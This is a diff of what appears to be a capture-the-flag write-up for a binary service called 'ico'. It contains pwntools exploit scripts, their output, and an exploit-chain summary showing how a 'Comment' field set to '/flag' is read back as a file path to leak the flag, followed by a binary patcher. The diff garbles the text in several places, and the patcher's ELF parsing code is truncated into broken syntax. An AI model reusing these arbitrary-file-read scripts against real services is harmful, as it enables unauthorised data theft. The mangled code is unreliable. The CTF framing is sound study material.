@@ -11,11 +11,6 @@
  Stack: No canary found
  NX: NX enabled
  PIE: No PIE (0x400000)
-```
-
-
-
-```
 from pwn import remote # type: ignore
 import os, sys, time
 
@@ -43,26 +38,17 @@ idx = data.find(b"Author")
 if idx != -1:
  # naive slice forward; adjust if you want a proper parser
  print("Found 'Author' near:", idx)
- print(data[idx:idx+256])
+ print(data[idx:
+idx+256])
 
 # clean close (optional)
 io.send(b"\x11")
 io.close()
-```
-
-
-
-```
 [x] Opening connection to 127.0.0.1 on port 4265
 [x] Opening connection to 127.0.0.1 on port 4265: Trying 127.0.0.1
 [+] Opening connection to 127.0.0.1 on port 4265: Done
 len=2 hex=0001
 [*] Closed connection to 127.0.0.1 port 4265
-```
-
-
-
-```
 On each connection, before handling commands, it loads the contents of /flag into a global string buffer off_51C2E0:
  idk_what_this_is_man → sets path to "/flag", reads it, stores pointer into off_51C2E0.
 
@@ -71,11 +57,6 @@ On each connection, before handling commands, it loads the contents of /flag int
 - "Comment" (only if previously set via 0x31)
 - "Software" → the string at +72
 - It requires one extra byte after 0x32 (any small value; used as a dimension).
-```
-
-
-
-```
 from __future__ import annotations
 
 from pwn import remote # type: ignore
@@ -171,27 +152,18 @@ def main():
  finally:
  try:
  send_cmd(io, b"\x11") # close session politely
- except Exception:
+ 
+except Exception:
  pass
  io.close()
 
 if __name__ == "__main__":
  main()
-```
-
-
-
-```
 [x] Opening connection to 127.0.0.1 on port 4265
 [x] Opening connection to 127.0.0.1 on port 4265: Trying 127.0.0.1
 [+] Opening connection to 127.0.0.1 on port 4265: Done
 No parsable KV bundle. Raw chunk (153 bytes): 89504e470d0a1a0a0000000d494844520000000200000002080600000072b60d240000001049444154789c63606060f80fc51002001cf502fe6a1cd9170000002774455874417574686f72004433454236413636393436383137434438423834463533304333303833414539388d42bd0000001174455874536f6674776172650069636f2076302e3155c7b0f20000000049454e44ae426082
 [*] Closed connection to 127.0.0.1 port 4265
-```
-
-
-
-```
 00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452 .PNG........IHDR
 00000010: 0000 0002 0000 0002 0806 0000 0072 b60d .............r..
 00000020: 2400 0000 1049 4441 5478 9c63 6060 60f8 $....IDATx.c```.
@@ -202,11 +174,6 @@ No parsable KV bundle. Raw chunk (153 bytes): 89504e470d0a1a0a0000000d4948445200
 00000070: 0000 0011 7445 5874 536f 6674 7761 7265 ....tEXtSoftware
 00000080: 0069 636f 2076 302e 3155 c7b0 f200 0000 .ico v0.1U......
 00000090: 0049 454e 44ae 4260 82 .IEND.B`.
-```
-
-
-
-```
 Applied thorough IDA updates:
 - Renamed key routines: server_main, accept_fork_loop, handle_connection, dispatch_loop, drop_privileges_to_user, set_alarm_seconds, recv_checked, send_checked, send_ack, send_nack, send_tagged_blob, read_u16_le, recv_allocated_blob, command handlers cmd_*, init_flag_from_file, init_default_metadata_with_flag, metadata getters get_author/get_software/get_comment_value, and parse_ncif_container.
 - Renamed global off_51C2E0 to g_FlagString.
@@ -214,21 +181,16 @@ Applied thorough IDA updates:
 
 Impact:
 The decompilation now clearly reflects the protocol, the /flag loading, and the metadata flow used for exfil.
-```
-
-
-
-```
 Full exploit chain (concise)
 Server boot
 
-server_main: 
+server_main:
 sets PORT (default 4265), creates listening socket.
 
-accept_fork_loop: 
-accept(), fork(). 
+accept_fork_loop:
+accept(), fork().
 
-In child: 
+In child:
 drop_privileges_to_user, set_alarm_seconds(16), close listen fd, then handle_connection.
 
 Per-connection setup
@@ -279,11 +241,6 @@ Read one chunk: tag (1), length (2 LE), payload.
 
 Payload is a small container; scanning printables, the token “Author” is followed by the flag string.
 The included poc_ncif.py does this sequence and extracts “Author”.
-```
-
-
-
-```
 from __future__ import annotations
 
 from pwn import remote # type: ignore
@@ -353,7 +310,8 @@ def parse_png_text_chunks(payload: bytes) -> Dict[str, str]:
  v = value.decode("latin-1", errors="ignore")
  if k:
  out[k] = v
- except Exception:
+ 
+except Exception:
  pass
  if ctype == b"IEND":
  break
@@ -426,17 +384,13 @@ def main():
  finally:
  try:
  send_cmd(io, b"\x11") # close session politely
- except Exception:
+ 
+except Exception:
  pass
  io.close()
 
 if __name__ == "__main__":
  main()
-```
-
-
-
-```
 [x] Opening connection to 127.0.0.1 on port 4265
 [x] Opening connection to 127.0.0.1 on port 4265: Trying 127.0.0.1
 [+] Opening connection to 127.0.0.1 on port 4265: Done
@@ -446,27 +400,12 @@ Parsed fields:
 
 Author (likely flag): 1B5B55E424237B0FF70D2DAE6D79F226
 [*] Closed connection to 127.0.0.1 port 4265
-```
-
-
-
-```
 Evidence:
 Your extract: Author = 1B5B55E424237B0FF70D2DAE6D79F226
 
 MD5(flag{WINNER_WINNER_CHICKEN_DINNER}) = 1B5B55E424237B0FF70D2DAE6D79F226 (matches)
-```
-
-
-
-```
 echo -en 'flag{WINNER_WINNER_CHICKEN_DINNER}' | md5sum
 1b5b55e424237b0ff70d2dae6d79f226 -
-```
-
-
-
-```
 from __future__ import annotations
 
 from pwn import remote # type: ignore
@@ -540,7 +479,8 @@ def parse_png_text_chunks(payload: bytes) -> Dict[str, str]:
  v = value.decode("latin-1", errors="ignore")
  if k:
  out[k] = v
- except Exception:
+ 
+except Exception:
  pass
  if ctype == b"IEND":
  break
@@ -639,22 +579,19 @@ def main():
  print(f"\nPlaintext flag via comment: {plain.decode('utf-8', errors='ignore')}")
  else:
  print("\nFailed to fetch plaintext flag via comment.")
- except Exception as e:
+ 
+except Exception as e:
  print(f"\nError fetching plaintext flag via comment: {e}")
  finally:
  try:
  send_cmd(io, b"\x11") # close session politely
- except Exception:
+ 
+except Exception:
  pass
  io.close()
 
 if __name__ == "__main__":
  main()
-```
-
-
-
-```
 [x] Opening connection to 127.0.0.1 on port 4265
 [x] Opening connection to 127.0.0.1 on port 4265: Trying 127.0.0.1
 [+] Opening connection to 127.0.0.1 on port 4265: Done
@@ -667,20 +604,11 @@ Author (MD5 of flag): 1B5B55E424237B0FF70D2DAE6D79F226
 Plaintext flag via comment: flag{WINNER_WINNER_CHICKEN_DINNER}
 
 [*] Closed connection to 127.0.0.1 port 4265
-```
-
-
-
-```
 0x10 enables the session (ACK).
-0x22 creates a default entry: it sets type at offset +48 to 2 (path mode), Author to g_FlagString (MD5-hex of /flag), Software to "ico v0.1".
+0x22 creates a default en
+try: it sets type at offset +48 to 2 (path mode), Author to g_FlagString (MD5-hex of /flag), Software to "ico v0.1".
 0x31 length-prefixed blob sets the Comment value at offset +56 (we send "/flag").
 0x30 returns the Comment. Because type==2, the server treats Comment as a path and returns file contents → plaintext flag.
-```
-
-
-
-```
 #!/usr/bin/env python3
 """
 Minimal, pure-Python patcher for 'ico' to disable comment-as-path default.
@@ -691,7 +619,7 @@ We change the imm8 to 0x1 so comment type defaults to LITERAL (1).
 
 Implementation details:
 - Computes file offset of the VA via ELF program headers (PT_LOAD mapping)
-- Writes one byte at (file_off + 3), since the encoding is: C6 .. .. <imm8>
+- Writes one byte at (file_off + 3), since the encoding is: C6 .. .. 
 
 Usage:
  python3 patch_simple.py /path/to/ico
@@ -725,18 +653,7 @@ def elf64_read_phdr_mapping(f) -> Tuple[int, int, int]:
  ph = f.read(e_phentsize)
  if len(ph) < e_phentsize:
  break
- p_type = struct.unpack_from("<I", ph, 0x00)[0]
- if p_type != 1: # PT_LOAD
- continue
- p_offset = struct.unpack_from("<Q", ph, 0x08)[0]
- p_vaddr = struct.unpack_from("<Q", ph, 0x10)[0]
- p_filesz = struct.unpack_from("<Q", ph, 0x20)[0]
- p_memsz = struct.unpack_from("<Q", ph, 0x28)[0]
- if p_vaddr <= TARGET_VA < p_vaddr + p_memsz:
- return p_offset, p_vaddr, p_filesz
- raise RuntimeError("could not map VA to file offset (no PT_LOAD contains it)")
-
-def main() -> None:
+ p_type = struct.unpack_from(" None:
  path = sys.argv[1] if len(sys.argv) > 1 else "ico"
  if not os.path.isfile(path):
  print(f"error: binary not found: {path}")
